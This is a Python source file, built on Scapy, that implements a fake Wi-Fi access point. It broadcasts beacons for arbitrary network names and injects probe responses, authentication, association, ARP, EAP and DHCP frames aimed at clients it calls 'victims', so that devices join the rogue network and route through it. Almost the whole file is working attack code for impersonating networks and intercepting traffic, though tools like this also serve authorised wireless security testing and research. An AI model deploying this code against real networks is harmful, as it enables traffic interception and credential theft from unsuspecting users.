from scapy.all import *
from time import time, sleep
import threading
from eap import *
from snoopsys import *

AP_RATES = "\x0c\x12\x18\x24\x30\x48\x60\x6c"
RSN = "\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x01\x28\x00"
DEFAULT_DNS_SERVER = "8.8.8.8"

def getRadiotapFrequency(channel):
    freq = 0
    if channel == 14:
        freq = 2484
    else:
        freq = 2407 + (channel * 5)

    freqString = struct.pack("<h", freq)

    return freqString

def hAddrBytes(mac):
    return ''.join(chr(int(x, 16)) for x in mac.split(':'))

class FakeAccessPoint(object):
    class FakeBeaconTransmitter(threading.Thread):
        def __init__(self, ap):
            threading.Thread.__init__(self)
            self.ap = ap
            self.setDaemon(True)
            self.interval = 0.2

        def run(self):
            global RSN

            while True:
                for ssid in self.ap.ssids:
                    # Create beacon packet
                    beaconPacket = self.ap.getRadioTap()                                                                                \
                                 / Dot11(subtype = 8, addr1 = 'ff:ff:ff:ff:ff:ff', addr2 = self.ap.mac, addr3 = self.ap.mac) \
                                 / Dot11Beacon(cap = 0x2105)                                                    \
                                 / Dot11Elt(ID = 'SSID', info = ssid)                                   \
                                 / Dot11Elt(ID = 'Rates', info = AP_RATES)                                      \
                                 / Dot11Elt(ID = 'DSset', info = chr(self.ap.channel))

                    if self.ap.wpa:
                        beaconPacket[Dot11Beacon].cap = 0x3101
                        rsnInfo = Dot11Elt(ID = 'RSNinfo', info = RSN)
                        beaconPacket = beaconPacket / rsnInfo

                    # Update sequence number
                    beaconPacket.SC = self.ap.nextSC()

                    # Update timestamp
                    beaconPacket[Dot11Beacon].timestamp = self.ap.currentTimestamp()

                    # Send
                    sendp(beaconPacket, iface = self.ap.interface, verbose=False)

                # Sleep
                sleep(self.interval)

    def __init__(self, interface, channel, mac, mode, wpa = False):
        self.ssids = []

        if mode == '1':
            self.nohostapd = True
        else:
            self.nohostapd = False

        self.mac = mac
        self.ip = "192.168.3.1"
        self.channel = channel
        self.boottime = time()
        self.sc = 0
        self.aid = 0
        self.mutex = threading.Lock()
        self.wpa = wpa
        self.eap_manager = EAPManager()
        self.interface = interface

        if self.nohostapd:
            self.beaconTransmitter = self.FakeBeaconTransmitter(self)
            self.beaconTransmitter.start()

    def addSSID(self, ssid):
        if not ssid in self.ssids and ssid != '':
            self.ssids.append(ssid)

    def removeSSID(self, ssid):
        if ssid in self.ssids:
            self.ssids.remove(ssid)

    def currentTimestamp(self):
        return (time() - self.boottime) * 1000000

    def nextSC(self):
        temp = 0
        self.mutex.acquire()
        self.sc = (self.sc + 1) % 4096
        temp = self.sc
        self.mutex.release()

        return temp * 16 # Fragment number -> right 4 bits

    def nextAID(self):
        temp = 0
        self.mutex.acquire()
        self.aid = (self.aid + 1) % 2008
        temp = self.aid
        self.mutex.release()

        return temp

    def getRadioTap(self):
        radioTapPacket = RadioTap(len = 18, present = 'Flags+Rate+Channel+dBm_AntSignal+Antenna', notdecoded = '\x00\x6c' + getRadiotapFrequency(self.channel) + '\xc0\x00\xc0\x01\x00\x00')
        return radioTapPacket

    def injectProbeResponse(self, victim, ssid):
        global RSN

        probeResponsePacket = self.getRadioTap() \
                            / Dot11(subtype = 5, addr1 = victim, addr2 = self.mac, addr3 = self.mac, SC = self.nextSC()) \
                            / Dot11ProbeResp(timestamp = self.currentTimestamp(), beacon_interval = 0x0064, cap = 0x2104) \
                            / Dot11Elt(ID = 'SSID', info = ssid) \
                            / Dot11Elt(ID = 'Rates', info = AP_RATES) \
                            / Dot11Elt(ID = 'DSset', info = chr(self.channel))
        # If we are an RSN network, add RSN data to response
        if self.wpa:
            probeResponsePacket[Dot11ProbeResp].cap = 0x3101
            rsnInfo = Dot11Elt(ID = 'RSNinfo', info = RSN)
            probeResponsePacket = probeResponsePacket / rsnInfo

        sendp(probeResponsePacket, iface = self.interface, verbose=False)

    def injectAuthSuccess(self, victim):
        authPacket = self.getRadioTap() \
                   / Dot11(subtype = 0x0B, addr1 = victim, addr2 = self.mac, addr3 = self.mac, SC = self.nextSC()) \
                   / Dot11Auth(seqnum = 0x02)

        debug_print("Injecting Authentication (0x0B)...", 2)
        sendp(authPacket, iface = self.interface, verbose=False)

    def injectAck(self, victim):
        ackPacket = self.getRadioTap() \
                   / Dot11(type = 'Control', subtype = 0x1D, addr1 = victim)
                   #/ Dot11(type = 'Control', subtype = 29, addr1 = victim, FCfield = "pw-mgt")

        print("Injecting ACK (0x1D) to %s ..." % victim)
        sendp(ackPacket, iface = self.interface, verbose=False)

    def injectAssociationSuccess(self, victim, reassoc):
        response_subtype = 0x01
        if reassoc == 0x02:
            response_subtype = 0x03
        assocPacket = self.getRadioTap() \
                    / Dot11(subtype = response_subtype, addr1 = victim, addr2 = self.mac, addr3 = self.mac, SC = self.nextSC()) \
                    / Dot11AssoResp(cap = 0x2104, status = 0, AID = self.nextAID()) \
                    / Dot11Elt(ID = 'Rates', info = AP_RATES)

        debug_print("Injecting Association Response (0x01)...", 2)
        sendp(assocPacket, iface = self.interface, verbose = False)

    def injectCTS(self, victim):
        CTSPacket = self.getRadioTap() \
                  / Dot11(ID = 0x99, type = 'Control', subtype = 12, addr1 = victim, addr2 = self.mac, SC = self.nextSC())

        debug_print("Injecting CTS (0x0C)...", 2)
        sendp(CTSPacket, iface = self.interface, verbose = False)

    def injectARP(self, victimMac, victimIp):
        ARPPacket = self.getRadioTap() \
                  / Dot11(type = "Data", subtype = 0, addr1 = victimMac, addr2 = self.mac, addr3 = self.mac, SC = self.nextSC(), FCfield = 'from-DS') \
                  / LLC(dsap = 0xaa, ssap = 0xaa, ctrl = 0x03) \
                  / SNAP(OUI = 0x000000, code = ETH_P_ARP) \
                  / ARP(psrc = self.ip, pdst = victimIp, op = "is-at", hwsrc = self.mac, hwdst = victimMac)

        debug_print("Injecting ARP", 2)
        sendp(ARPPacket, iface = self.interface, verbose = False)

    def injectEAPPacket(self, victim, eap_code, eap_type, eap_data):
        EAPPacket = self.getRadioTap() \
                        / Dot11(type = "Data", subtype = 0, addr1 = victim, addr2 = self.mac, addr3 = self.mac, SC = self.nextSC(), FCfield = 'from-DS') \
                        / LLC(dsap = 0xaa, ssap = 0xaa, ctrl = 0x03) \
                        / SNAP(OUI = 0x000000, code = 0x888e) \
                        / EAPOL(version = 1, type = 0) \
                        / EAP(code = eap_code, id = self.eap_manager.next_id(), type = eap_type)

        if not eap_data is None:
            EAPPacket = EAPPacket / Raw(eap_data)

        debug_print("Injecting EAP Packet (code = %d, type = %d, data = %s)" % (eap_code, eap_type, eap_data), 2)
        sendp(EAPPacket, iface = self.interface, verbose = False)

    def injectEAPSuccess(self, victim):
        EAPSuccessPacket = self.getRadioTap() \
                        / Dot11(type = "Data", subtype = 0, addr1 = victim, addr2 = self.mac, addr3 = self.mac, SC = self.nextSC(), FCfield = 'from-DS') \
                        / LLC(dsap = 0xaa, ssap = 0xaa, ctrl = 0x03) \
                        / SNAP(OUI = 0x000000, code = 0x888e) \
                        / EAPOL(version = 1, type = 0) \
                        / EAP(code = EAPCode.SUCCESS, id = self.eap_manager.next_id())

        debug_print("Injecting EAP Success", 2)
        sendp(EAPSuccessPacket, iface = self.interface, verbose = False)

    def injectRawPacket(self, victim, raw_data):
        RawPacket = Raw(raw_data)

        debug_print("Injecting RAW packet", 2)
        sendp(RawPacket, iface = self.interface, verbose = False)

    def handleDHCP(self, pkt):
        serverIp = self.ip
        clientIp = "192.168.3.2" # For now just use only one client
        serverMac = self.mac
        clientMac = pkt.addr2
        subnetMask = "255.255.255.0"
        gateway = "0.0.0.0"

        #If DHCP Discover then DHCP Offer
        if DHCP in pkt and pkt[DHCP].options[0][1] == 1:
            debug_print("DHCP Discover packet detected", 2)

            dhcpOfferPacket = self.getRadioTap() \
                            / Dot11(type = "Data", subtype = 0, addr1 = "ff:ff:ff:ff:ff:ff", addr2 = serverMac, SC = self.nextSC(), FCfield = 'from-DS') \
                            / LLC(dsap = 0xaa, ssap = 0xaa, ctrl = 0x03) \
                            / SNAP(OUI = 0x000000, code = ETH_P_IP) \
                            / IP(src = serverIp, dst = clientIp) \
                            / UDP(sport=67, dport=68) \
                            / BOOTP(op = 2, yiaddr = clientIp, siaddr = serverIp, giaddr = gateway, chaddr = hAddrBytes(clientMac), xid = pkt[BOOTP].xid) \
                            / DHCP(options = [('message-type', 'offer')]) \
                            / DHCP(options = [('subnet_mask', subnetMask)]) \
                            / DHCP(options = [('server_id', serverIp),('end')])

            sendp(dhcpOfferPacket, iface = self.interface, verbose = False)
            debug_print("DHCP Offer packet sent", 2)

        #If DHCP Request then DHCP Ack
        if DHCP in pkt and pkt[DHCP].options[0][1] == 3:
            debug_print("DHCP Request packet detected", 2)
            dhcpAckPacket = self.getRadioTap() \
                          / Dot11(type = "Data", subtype = 0, addr1 = "ff:ff:ff:ff:ff:ff", addr2 = serverMac, SC = self.nextSC(), FCfield = 'from-DS') \
                          / LLC(dsap = 0xaa, ssap = 0xaa, ctrl = 0x03) \
                          / SNAP(OUI = 0x000000, code = ETH_P_IP) \
                          / IP(src = serverIp, dst = clientIp) \
                          / UDP(sport = 67,dport = 68) \
                          / BOOTP(op = 2, yiaddr = clientIp, siaddr = serverIp, giaddr = gateway, chaddr = hAddrBytes(clientMac), xid = pkt[BOOTP].xid) \
                          / DHCP(options = [('message-type','ack')]) \
                          / DHCP(options = [('server_id', serverIp)]) \
                          / DHCP(options = [('lease_time', 43200)]) \
                          / DHCP(options = [('subnet_mask', subnetMask)]) \
                          / DHCP(options = [('router', serverIp)]) \
                          / DHCP(options = [('name_server', DEFAULT_DNS_SERVER)]) \
                          / DHCP(options = [('domain', "localdomain")]) \
                          / DHCP(options = [('end')])
            sendp(dhcpAckPacket, iface = self.interface, verbose = False)
            debug_print("DHCP Ack packet sent", 2)